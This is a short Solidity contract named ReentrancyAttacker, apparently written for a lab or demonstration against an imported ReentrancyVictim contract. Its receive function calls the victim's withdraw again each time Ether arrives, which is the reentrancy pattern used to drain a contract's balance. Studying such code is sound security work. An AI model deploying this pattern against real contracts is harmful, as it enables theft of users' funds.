// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "./ReentrancyVictim.sol";

contract ReentrancyAttacker {
    function deposit(address payable _to) external payable {
        (bool success, ) = _to.call{value: msg.value}("");
        require(success, "Failed to send Ether");
    }
    
    function attack(address payable _victim) public payable {
        if (_victim.balance >= msg.value) {
            ReentrancyVictim(_victim).withdraw();
        }
    }

    // receive function is called whenever the attacker receives Ether
    receive() external payable {
        attack(payable(msg.sender));
    }
}